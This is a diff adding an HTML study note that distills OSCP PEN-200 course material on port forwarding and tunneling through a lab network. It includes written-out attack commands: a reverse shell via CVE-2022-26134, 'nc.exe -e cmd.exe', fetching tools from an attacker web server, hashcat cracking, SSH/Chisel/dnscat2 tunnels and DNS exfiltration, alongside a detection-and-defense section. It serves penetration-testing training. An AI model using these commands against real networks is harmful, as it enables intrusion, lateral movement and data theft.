@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-200 — Port Redirection &amp; Tunneling (blocks PRAT: SOCAT/SSH/sshuttle/ssh.exe/plink/netsh; PRAT2: Chisel HTTP + dnscat2 DNS) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="index.html">Índice</a>
+<a class="nz-navbar__link" href="cat/oscp.html">OSCP (PEN-200)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSCP (PEN-200)</p>
+<h1 class="nz-h2">PEN-200 — Port Redirection &amp; Tunneling (blocks PRAT: SOCAT/SSH/sshuttle/ssh.exe/plink/netsh; PRAT2: Chisel HTTP + dnscat2 DNS)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<blockquote>
+<p>Distilled from OffSec PEN-200 (OSCP) course material (modules: Port Redirection and SSH Tunneling; Tunneling Through Deep Packet Inspection) — internal training reference, not for redistribution.</p>
+</blockquote>
+<h2>Objective</h2>
+<p>Once you have a foothold on a dual-homed host, the next wall is the network topology itself: the target you actually want sits on a subnet you cannot route to, and — in real engagements — perimeter firewalls and deep packet inspection (DPI) devices block everything but a couple of approved ports. This module builds a graduated toolkit for <strong>port redirection and tunneling</strong>: binding a listener on a host you control and pushing traffic through your foothold into deeper network layers. Each technique trades convenience against requirements (installed tools, open ports, privileges), so the skill is picking the right one for the current constraints:</p>
+<ul>
+<li>No firewall between you and the foothold → <strong>SOCAT</strong> port forward.</li>
+<li>SSH access to an internal host → <strong>SSH local / dynamic / remote / remote-dynamic</strong> port forwarding.</li>
+<li>Want transparent routing instead of per-tool proxying → <strong>sshuttle</strong> (VPN-like).</li>
+<li>Windows foothold → <strong>ssh.exe</strong>, <strong>plink.exe</strong>, or the native <strong>netsh portproxy</strong>.</li>
+<li>DPI permits only HTTP or DNS out of the network → <strong>Chisel</strong> (HTTP tunnel) or <strong>dnscat2</strong> (DNS tunnel).</li>
+</ul>
+<p>All scenarios reuse one spine: compromise <strong>Confluence01</strong> via CVE-2022-26134, then pivot toward a PostgreSQL server (<strong>pgdatabase01</strong>) and SMB host (<strong>HRshare</strong>) on successively deeper subnets.</p>
+<h2>Target surface</h2>
+<p>Lab topology as reconstructed from the videos (ASR hostnames; see flags footer):</p>
+<div class="nz-table-wrap"><table class="nz-table">
+<thead>
+<tr>
+<th>Network</th>
+<th>Role</th>
+<th>Hosts</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WAN</td>
+<td>"external"/attacker side (in the sim, a large internal network or the internet)</td>
+<td>Kali, <strong>felineauthority</strong> (authoritative NS for <code>feline.corp</code>)</td>
+</tr>
+<tr>
+<td>DMZ (10.4.50.0/24 side)</td>
+<td>buffer segment exposed to the WAN</td>
+<td><strong>Confluence01</strong> — 192.168.50.63 (WAN-facing, ens192) / 10.4.50.63 (DMZ, ens224), Confluence on TCP 8090; <strong>multiserver03</strong> — 10.4.50.64, DNS resolver / IIS web app / RDP</td>
+</tr>
+<tr>
+<td>Deeper internal (172.16.50.0/24)</td>
+<td>behind pgdatabase01</td>
+<td><strong>pgdatabase01</strong> — 172.16.50.215 (dual-homed into the DMZ), PostgreSQL TCP 5432 + SSH; <strong>HRshare</strong> — 172.16.50.217, SMB TCP 445</td>
+</tr>
+</tbody>
+</table></div>
+<p>Attack path per block: reverse shell on Confluence01 → credentials in <code>confluence.cfg.xml</code>-style config → port forward to PostgreSQL → hashcat the Confluence <code>cwd_user</code> table → password reuse onto pgdatabase01's SSH → enumerate/attack 172.16.50.0/24. A perimeter firewall is progressively tightened between sections: first none, then inbound-only-TCP-8090, then DPI allowing only HTTP out, and a variant where only DNS can cross.</p>
+<p>Credentials used are never spoken in the audio — passwords appear only as redacted values: Confluence DB creds (plaintext in the config file) <code>[REDACTED]</code>, cracked <code>databaseadmin</code> / <code>hradmin</code> / <code>rdpadmin</code> passwords <code>[REDACTED]</code>, <code>felineauthority</code> user <code>callie</code> password <code>[REDACTED]</code>.</p>
+<h2>Techniques</h2>
+<h3>1. Scenario and lab framing — PRAT_02_01</h3>
+<p>The motivating scenario: a Linux Confluence server vulnerable to <strong>CVE-2022-26134</strong> (pre-auth RCE) gives a reverse shell; enumeration reveals two NICs — one on the attacker's network, one on an internal subnet — plus plaintext PostgreSQL credentials and the DB server's IP/port in the Confluence config. Kali cannot route to the DB. Key vocabulary: <strong>WAN</strong> (big/expansive network — here standing in for the internet), <strong>DMZ</strong> (buffer segment of hosts more exposed to the less-trusted network). Open-socket icons on the diagram = listening TCP ports (8090 Confluence, 5432 PostgreSQL default).</p>
+<h3>2. Exploitation and enumeration of the pivot host — PRAT_02_02</h3>
+<p>The Rapid7 blog PoC for CVE-2022-26134 is a verbose <code>curl</code> to port 8090 whose URL path, once URL-decoded, is an <strong>OGNL injection</strong> (Object Graph Notation Language — Java expression language; injection = user input reaching the OGNL parser, and OGNL can execute Java) using Java's <code>ProcessBuilder</code> to spawn a bash interactive reverse shell. Rules applied:</p>
+<ul>
+<li>Never run a payload without decoding and understanding it.</li>
+<li>Re-target it manually: change the victim IP to <code>192.168.50.63</code> and the callback to the Kali listener — and <strong>do not blanket re-URL-encode</strong>, because the PoC deliberately leaves certain characters unencoded; encoding them changes how the server parses the URL and breaks execution.</li>
+<li>Start a Netcat listener on TCP 4444, fire the curl, catch the shell; <code>id</code> shows the low-privileged <strong>confluence</strong> user.</li>
+</ul>
+<p>Enumeration: <code>ip address</code> shows ens192 = 192.168.50.63 and ens224 = 10.4.50.63; <code>ip route</code> shows which subnets are reachable per interface. The config file yields the DB IP/port and plaintext credentials — but no <code>psql</code> on the box and no ability to install software as the low-priv user. With no firewall between Kali and Confluence01, the answer is a <strong>port forward on Confluence01</strong>.</p>
+<h3>3. Port forwarding with SOCAT — PRAT_02_03</h3>
+<p>SOCAT is a general-purpose relay that sets up a port forward in one command. On Confluence01:</p>
+<pre><code class="language-bash">socat -v tcp-listen:2345,fork tcp:&lt;pgdatabase01-dmz-ip&gt;:5432
+</code></pre>
+<p><code>-v</code> verbose, <code>tcp-listen:2345</code> binds the WAN interface, <code>fork</code> handles repeated connections instead of dying after the first, and the second socket is the forward target. From Kali, <code>psql</code> against Confluence01:2345 is now exactly a direct connection to PostgreSQL. In the <code>confluence</code> database, <code>SELECT * FROM cwd_user;</code> returns user rows with <strong>Atlassian password hashes</strong> — crack with:</p>
+<pre><code class="language-bash">hashcat -m 12001 hashes.txt fasttrack.txt
+</code></pre>
+<p>(mode 12001 = Atlassian; FastTrack is built into Kali). Weak policy → <code>databaseadmin</code>, <code>hradmin</code>, <code>rdpadmin</code> fall in minutes. Suspect reuse: enumeration shows pgdatabase01 also runs SSH. Kill the 2345 forward and re-bind:</p>
+<pre><code class="language-bash">socat -v tcp-listen:2222,fork tcp:&lt;pgdatabase01-dmz-ip&gt;:22
+ssh databaseadmin@&lt;confluence01-wan-ip&gt; -p 2222
+</code></pre>
+<p>Password reuse confirmed — SSH as <code>databaseadmin</code> onto the DB server itself.</p>
+<h3>4. SSH local port forwarding (-L) — PRAT_03_01</h3>
+<p>SOCAT's limitation: listening and forwarding happen on the same host. With <strong>SSH local forwarding</strong>, the SSH <em>client</em> opens the listener and tunnels packets through the connection to the SSH <em>server</em>, which forwards them onward. New wrinkle: SOCAT is no longer on Confluence01, so SSH in from Confluence01 to pgdatabase01 (stabilize the reverse shell with Python's <code>pty</code> module first), then enumerate: <code>ip address</code> / <code>ip route</code> reveal pgdatabase01 is dual-homed onto <strong>172.16.50.0/24</strong>. No port scanner installed — sweep with netcat instead:</p>
+<pre><code class="language-bash">for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445 2&gt;&amp;1; done | grep succeeded
+</code></pre>
+<p>Most time out; pgdatabase01 (172.16.50.215) actively refuses; <strong>172.16.50.217</strong> has 445 open (SMB). Rather than pull files hop-by-hop (172.16.50.217 → pgdatabase01 → Confluence01 → Kali), bind the forward <em>inside</em> the SSH connection:</p>
+<pre><code class="language-bash">ssh -L 0.0.0.0:4455:&lt;hrshare-ip&gt;:445 -n databaseadmin@&lt;pgdatabase01-ip&gt;
+</code></pre>
+<p><code>-L</code> takes two sockets (listen-socket on the client : forward-socket); <code>-n</code> prevents a shell from opening (no output after the password is normal). The first reverse shell is now occupied by the SSH session, so catch a second shell with a re-targeted CVE payload, then confirm the listener with <code>ss</code>. From Kali:</p>
+<pre><code class="language-bash">smbclient -L &lt;confluence01-wan-ip&gt; -p 4455 -U hradmin --password=[REDACTED]
+</code></pre>
+<p>Listing the <code>scripts</code> share and downloading its file lands it straight on Kali — the tunnel erased the intermediate hops.</p>
+<h3>5. SSH dynamic port forwarding (-D) + Proxychains — PRAT_03_02</h3>
+<p>Local forwarding connects to <strong>one socket per SSH connection</strong> — tedious at scale. Dynamic forwarding makes the client listener a <strong>SOCKS proxy</strong> port: packets pushed through it reach <em>any</em> host/port the SSH server can route to, provided the client software speaks SOCKS. Setup:</p>
+<pre><code class="language-bash">ssh -D 0.0.0.0:9999 -n databaseadmin@&lt;pgdatabase01-ip&gt;
+</code></pre>
+<p><code>smbclient</code> has no SOCKS option, so bridge with <strong>proxychains</strong>, whose config (<code>/etc/proxychains4.conf</code>) ends with the proxy definitions — replace them with a single <code>socks5 &lt;confluence01-wan-ip&gt; 9999</code> line. Prepend the command instead of retargeting it:</p>
+<pre><code class="language-bash">proxychains smbclient -L &lt;hrshare-ip&gt; -U hradmin --password=[REDACTED]   # talks as if directly routed
+proxychains nmap -sT -n -Pn --top-ports=20 -vvv &lt;hrshare-ip&gt;
+</code></pre>
+<p>Nmap flags: TCP connect scan (works through a proxy), skip DNS resolution, skip host discovery, top-20 ports; proxychains <code>-vvv</code> logs every attempted socket. Result: <strong>135, 139, 445, 3389</strong> open on HRshare. Tools that aren't SOCKS-aware ride the tunnel transparently via proxychains.</p>
+<h3>6. SSH remote port forwarding (-R) — PRAT_03_03</h3>
+<p>Real networks firewalls the fun away: inbound is controlled far more aggressively than outbound, so you can rarely connect to a port bound on the perimeter — but you can usually <strong>SSH out</strong>. Remote forwarding is "a reverse shell, but for port forwarding": the compromised host SSHes back to <em>your</em> SSH server and binds the listener there. Scenario: perimeter firewall permits only TCP 8090 inbound to Confluence01. On Kali, start the pre-installed OpenSSH server (<code>ss</code> confirms 22 on all interfaces, v4+v6), then from Confluence01:</p>
+<pre><code class="language-bash">ssh -R 2345:&lt;pgdatabase01-dmz-ip&gt;:5432 -n kali@&lt;kali-ip&gt;
+psql -h 127.0.0.1 -p 2345 -U postgres   # on Kali — loopback listener, tunneled back through Confluence01
+</code></pre>
+<p>The <code>-R</code> syntax mirrors <code>-L</code> (listen socket first, forward socket second), but the listener lands on the SSH <em>server</em> (Kali loopback) and packets are forwarded by the SSH <em>client</em> (Confluence01). Database reached despite the firewall.</p>
+<h3>7. SSH remote <em>dynamic</em> port forwarding — PRAT_03_04</h3>
+<p>Remote forwarding keeps the one-socket-per-connection limitation. Remote dynamic forwarding combines <code>-R</code> with SOCKS: pass only a port and the SOCKS proxy binds on the SSH server's loopback; traffic flows back through the tunnel and out wherever the client can route. From Confluence01:</p>
+<pre><code class="language-bash">ssh -R 9998 -n kali@&lt;kali-ip&gt;        # bare port → SOCKS on Kali loopback
+ss -lnt                              # on Kali: 9998 bound on v4+v6 loopback
+</code></pre>
+<p>Point <code>/etc/proxychains4.conf</code> at 9998 and scan the newly-found DMZ Windows box (blocked on the WAN except via Confluence01):</p>
+<pre><code class="language-bash">proxychains nmap -sT -n -Pn --top-ports=20 -vvv &lt;multiserver03-ip&gt;   # → 80, 135, 3389 open
+</code></pre>
+<p>This is the go-to for a fully firewalled foothold: one outbound SSH connection gives Kali a SOCKS port into everything Confluence01 can reach.</p>
+<h3>8. sshuttle — PRAT_03_05</h3>
+<p>Classic dynamic forwarding gets hard to manage with complex internal networks. <strong>sshuttle</strong> turns an SSH connection into something VPN-like by installing local routes that force traffic through the tunnel — no proxychains, tools connect transparently. Requirements: root on the SSH <em>client</em>, Python 3 on the SSH <em>server</em> (not always lightweight). In the lab, run it from Kali through the existing SOCAT forward (port 2222 → pgdatabase01:22):</p>
+<pre><code class="language-bash">sudo sshuttle -r databaseadmin@&lt;confluence01-wan-ip&gt; --ssh-cmd 'ssh -p 2222' 172.16.50.0/24
+</code></pre>
+<p>Afterward <code>smbclient</code> against HRshare works with zero proxy configuration — Kali behaves as if it were on pgdatabase01's network.</p>
+<h3>9. ssh.exe — SSH tunneling from Windows — PRAT_04_01</h3>
+<p>The OpenSSH client ships with Windows by default since the <strong>1803</strong> April 2018 update (ASR garbles this as "version 1.8.0.3") and as a Feature-on-Demand since 1709; binaries (<code>ssh.exe</code>, <code>scp.exe</code>, <code>sftp.exe</code>) live in <code>C:\Windows\System32\OpenSSH\</code>. Scenario: only RDP is open on multiserver03. RDP in with <code>xfreerdp</code> using the cracked <code>rdpadmin</code> credentials, open cmd.exe, verify with <code>where ssh</code> — found, and the bundled version &gt; 7.6 supports remote dynamic forwarding:</p>
+<pre><code>ssh -R 9998 -n kali@&lt;kali-ip&gt;        # from cmd.exe on multiserver03
+</code></pre>
+<p>Point proxychains at the resulting SOCKS port on Kali and run <code>psql</code> through it — same command shape as a direct connection from multiserver03. Windows 11 client → Kali SSH server → pgdatabase01, all over an outbound SSH tunnel.</p>
+<h3>10. plink.exe — when OpenSSH is removed — PRAT_04_02</h3>
+<p>Admins may strip OpenSSH; the pre-bundling standard was <strong>PuTTY</strong> and its CLI counterpart <strong>plink</strong> (prefer plink in assessments — shell, not GUI). Scenario: multiserver03 now only exposes the web app on TCP 80; RDP blocked, ssh.exe removed. Chain: compromise the web app → drop a web shell (runs as the IIS default app-pool user) → start Apache2 on Kali, copy <code>nc.exe</code> from the <code>/usr/share/windows-resources/binaries/</code> directory into the web root → download it via a PowerShell one-liner (<code>-outfile c:\windows\temp\nc.exe</code>) from the web shell → nc listener on 4446 on Kali → execute <code>nc.exe -e cmd.exe</code> from the shell → interactive shell. Then pull <strong>plink.exe</strong> the same way and build a remote port forward to reach the (firewalled) RDP port:</p>
+<pre><code>plink -R 9833:127.0.0.1:3389 kali@&lt;kali-ip&gt; -pw [REDACTED]
+</code></pre>
+<p>plink accepts username and password on the command line and prompts to cache the server host key. <code>ss</code> confirms 9833 on Kali loopback; connect with <code>xfreerdp /v:&lt;kali-ip&gt;:9833</code> (custom RDP port appended to the address). Piping keystrokes into plink is discussed as the workaround for restrictive non-interactive shells.</p>
+<h3>11. netsh portproxy — native Windows forwarding — PRAT_04_03</h3>
+<p>Fully native option: <strong>netsh</strong> (Network Shell), <code>interface portproxy</code> subcontext — requires <strong>administrative privileges</strong>. Scenario: RDP directly into multiserver03; want SSH from Kali to pgdatabase01 via a forward on multiserver03. As administrator:</p>
+<pre><code>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=&lt;multiserver03-ext-ip&gt; connectport=22 connectaddress=&lt;pgdatabase01-ip&gt;
+netstat -ano | findstr 2222                    # confirm listening
+netsh interface portproxy show all             # confirm stored
+</code></pre>
+<p>Nmap from Kali shows <strong>filtered</strong> — the Windows firewall blocks the new listener. Poke the hole and remember it:</p>
+<pre><code>netsh advfirewall firewall add rule name=&quot;Port Forward SSH 2222&quot; dir=in action=allow protocol=TCP localport=2222
+</code></pre>
+<p>(descriptive names matter — the rule is deleted by name). Now <code>ssh</code> to port 2222 on multiserver03 lands on pgdatabase01:22. Cleanup, in order:</p>
+<pre><code>netsh advfirewall firewall delete rule name=&quot;Port Forward SSH 2222&quot;
+netsh interface portproxy delete v4tov4 listenport=2222 listenaddress=&lt;multiserver03-ext-ip&gt;
+</code></pre>
+<h3>12. HTTP tunneling with Chisel — PRAT2_01_01 + 01_02</h3>
+<p>New constraint: a <strong>DPI</strong> device terminates all outbound traffic except HTTP, and all inbound ports except 8090. A raw reverse shell and SSH remote forwarding both die at the perimeter — the tunnel must <em>look like</em> HTTP. <strong>Chisel</strong> encapsulates a data stream in HTTP (over a WebSocket, as tcpdump shows) with SSH inside for encryption; client-server model, and one binary serves both roles. Plan: Chisel <strong>server</strong> on Kali, Chisel <strong>client</strong> on Confluence01, with <strong>reverse port forwarding</strong> — a SOCKS proxy port binds on the <em>server</em> (Kali) when the client connects.</p>
+<p>Delivery: copy the chisel binary to the Apache2 web root, wget it down through the Confluence injection payload to <code>/tmp/chisel</code>, <code>chmod +x</code> (same amd64 Linux binary on both ends).</p>
+<pre><code class="language-bash"># Kali — server with reverse enabled (listens 8080)
+./chisel server --bind 0.0.0.0:8080 --reverse
+tcpdump -i ens192 tcp port 8080          # watch the websocket handshake arrive
+# Confluence01 (via web shell; shell redirections background it)
+./chisel client &lt;kali-ip&gt;:8080 R:socks &gt;/dev/null 2&gt;&amp;1 &amp;
+ss -lnt                                   # on Kali: SOCKS port 1080 on loopback
+</code></pre>
+<p>To push SSH itself through the SOCKS port, ssh has no generic SOCKS flag — use <code>ProxyCommand</code> with a netcat that supports <code>-x</code> (Kali's traditional nc doesn't; install <strong>ncat</strong>):</p>
+<pre><code class="language-bash">sudo apt install ncat
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' databaseadmin@&lt;pgdatabase01-ip&gt;
+</code></pre>
+<p><code>%h</code>/<code>%p</code> are filled by ssh with the target host/port. Result: SSH into the internal DB server over a reverse HTTP tunnel — only HTTP-formatted traffic ever left the DMZ.</p>
+<h3>13. DNS tunneling fundamentals + dnscat2 — PRAT2_02_01 + 02_02</h3>
+<p>Even a host with <em>no</em> outbound connectivity usually has DNS: pgdatabase01 resolves through multiserver03 (10.4.50.64, confirmed with <code>resolvectl</code>), which relays queries for <code>feline.corp</code> to the authoritative server <strong>felineauthority</strong> on the WAN — a box we control. Fundamentals, staged with <strong>dnsmasq</strong> as a minimal authoritative server (<code>auth-zone</code> / <code>auth-server</code> in a sparse conf; run foreground, tcpdump on UDP 53):</p>
+<ul>
+<li><strong>Exfiltration</strong>: <code>nslookup exfiltrateddata.feline.corp</code> from pgdatabase01 → NXDOMAIN (no records), but tcpdump on felineauthority receives the A query: arbitrary data has crossed the perimeter inside a DNS query, with no direct connection.</li>
+<li><strong>Infiltration</strong>: dnsmasq serves <code>txt-record</code> entries; <code>nslookup -type=txt feline.corp</code> from pgdatabase01 returns the arbitrary strings. Binary payloads can ride as base64/hex-encoded TXT records reassembled server-side.</li>
+</ul>
+<p><strong>dnscat2</strong> industrializes this: server on the authoritative NS (<code>dnscat2 feline.corp</code>, listening UDP 53), client on the compromised host (<code>./dnscat2 feline.corp</code>) → encrypted CNAME/TXT/MAX-type query chatter (tcpdump confirms; "DNS tunneling is certainly not stealthy"). The server session supports interactive windows (<code>windows</code>, <code>window -i &lt;id&gt;</code>), and its <strong><code>listen</code></strong> command works like <code>ssh -L</code> — a TCP forward through the DNS tunnel:</p>
+<pre><code>listen 127.0.0.1:4455 &lt;hrshare-ip&gt;:445      # in the dnscat2 command session
+smbclient -L 127.0.0.1 -p 4455 -U ...       # from another felineauthority shell
+</code></pre>
+<p>SMB-over-TCP encapsulated in DNS-over-UDP is slow — expected — but it lists shares on a host two network layers away from felineauthority, with neither HRshare nor pgdatabase01 having any direct route out.</p>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li><strong>SOCAT/netsh portproxy listeners</strong> on compromised hosts show up as unexpected local listeners — inventory <code>ss</code>/<code>netstat</code> baselines, alert on unusual bind addresses (0.0.0.0 on hosts that should not listen), and treat <code>netsh interface portproxy</code> rules and matching <code>advfirewall</code> rules as high-value persistence/redirect artifacts to audit (they survive until explicitly deleted).</li>
+<li><strong>SSH tunneling</strong>: outbound SSH from servers is rare and should be rare — egress-filter 22 (and detect long-lived outbound SSH sessions with sustained symmetric traffic). <code>-L/-D/-R</code> sessions all carry characteristic interactive/stream patterns; SSH audit logs (<code>sshd</code> on <em>your</em> boxes, the Kali side in the course) record every forward — defenders should log and review <code>local/remote/dynamic forward</code> messages on their own SSH servers, since attackers' relays are your visibility gap.</li>
+<li><strong>Proxychains/SOCKS</strong> funnels heterogeneous tooling through one socket: a single connection seeing sequential connects across many ports and services (smbclient, then nmap top-20) is the signature, not any individual tool.</li>
+<li><strong>sshuttle</strong> creates local routes and tunnels <em>all</em> traffic — endpoint-side detection is host-route changes; network-side it is essentially persistent SSH and high-volume.</li>
+<li><strong>CVE-2022-26134-class exploitation</strong> is the root cause everywhere here — patch internet-facing apps; and note the payload hygiene lesson cuts both ways: URL-encoding quirks that make PoCs break are also a detection feature (WAF rules can key on partially-encoded OGNL paths).</li>
+<li><strong>Password reuse</strong> (databaseadmin → SSH, rdpadmin → RDP) is what turns one webshell into network-wide access — enforce unique credentials per service, and store app-config DB passwords encrypted/least-privilege (the Confluence user should not hold credentials that also open SSH on the DB host).</li>
+<li><strong>DNS tunneling</strong>: dnscat2 is explicitly <em>not</em> stealthy — massive volumes of CNAME/TXT/MX queries to one authoritative zone, long random subdomains, NXDOMAIN storms. Detect per-client query volume, entropy of queried labels, and restrict internal resolvers from relaying arbitrary zones outbound; allow-list authoritative NS for domains you own. dnsmasq/authoritative servers you control should not resolve unknown zones for untrusted clients.</li>
+<li><strong>HTTP tunneling vs DPI</strong>: DPI that only whitelists HTTP is defeated by Chisel because format-compliance ≠ content-legitimacy — inspect for websockets to non-application hosts, unusual long-lived HTTP flows to single destinations, and binary uploads to servers that then generate outbound HTTP. Egress allow-listing to <em>destinations</em>, not just protocols, is the actual control.</li>
+<li><strong>Windows hosts</strong>: <code>where ssh</code>, presence of plink.exe/nc.exe in <code>C:\Windows\Temp</code>, and admin-context netsh calls are the host-side fingerprints; application-control/WDAC policies preventing unsigned binaries in temp and non-admin users from <code>netsh advfirewall</code>/<code>portproxy</code> changes blunt the whole Windows section.</li>
+<li>Cross-cutting: every technique assumed one foothold with valid credentials — the defensive priority is keeping that first foothold from becoming a routing node: segment so DMZ hosts cannot reach deeper subnets' admin services, and monitor for dual-homed hosts (the entire module is enabled by Confluence01's second NIC).</li>
+</ul>
+<hr />
+<h3>ASR-ambiguity flags (transcription caveats)</h3>
+<ul>
+<li><strong>Tool/term garbles fixed by inference</strong>: "SOX"/"SOC"/"SOCS proxy" → SOCKS; "ssh-ettle"/"SSA Shuttle" → sshuttle; "DNSMask"/"dnsconfig txt.conf" → dnsmasq (<code>dnsmasq.conf</code> / <code>txt-record</code> lines); "Netshell" → netsh; "ETSI proxy chains 4" → <code>/etc/proxychains4.conf</code>; "XFreeRDP from FreeRDP" → xfreerdp; "systemd resolved/ResolveCTL" → systemd-resolved / <code>resolvectl</code>; "windows resources binaries directory" → <code>/usr/share/windows-resources/binaries/</code>; "CWD user table" → <code>cwd_user</code>.</li>
+<li><strong>Windows version numbers</strong>: ASR "version 1.8.0.3 … April 2018 update" = Windows 10 <strong>1803</strong>; "1.7.0.9 … Fall Creators update" = <strong>1709</strong>.</li>
+<li><strong>Port ambiguity</strong>: plink forward port is rendered both <strong>9833</strong> and <strong>9983</strong> in the same video; 9833 used above (majority + the xfreerdp <code>/v:…:9833</code> mention). dnscat2 query types include "mx" per ASR — MX usage by dnscat2 is plausible but the exact set (CNAME/TXT/MX) is not verifiable from audio alone.</li>
+<li><strong>Hostnames</strong>: ASR renders Confluence1/pgDatabase1/Multiserver 3/HR shares/Feline Authority; actual course lab naming is Confluence01/pgdatabase01/multiserver03/HRshare/felineauthority — normalized above. "user Callie" on felineauthority is likely <code>callie</code>.</li>
+<li><strong>IPs not stated in audio</strong>: pgdatabase01's DMZ-facing address (reachable from Confluence01 on the 10.4.50.0/24 side) is never spoken — commands that target it show <code>&lt;pgdatabase01-dmz-ip&gt;</code>. Stated verbatim: 192.168.50.63, 10.4.50.63, 172.16.50.215, 172.16.50.217, 10.4.50.64, and 10.0.0.28 (the Rapid7 blog author's server, in the unmodified PoC only). The netcat sweep loop range and the exact <code>iptables</code>/<code>seq</code> arguments are command-shape reconstructions; the HRshare sweep output ("succeeded" grep) is inferred from the described time-outs/refusals.</li>
+<li><strong>Credentials</strong>: all passwords (Confluence DB config, postgres, cracked databaseadmin/hradmin/rdpadmin, plink <code>-pw</code>, callie) are redacted as <code>[REDACTED]</code> — the audio describes them being typed but never speaks the values.</li>
+<li><strong>Reconstructed listings</strong>: the dnsmasq conf variables (auth-zone/auth-server), chisel command shapes (<code>server --reverse</code>, <code>client … R:socks</code>), ncat ProxyCommand flags, and netsh rule syntax follow the tools' standard usage as described by narration; the video shows but does not dictate the exact strings.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
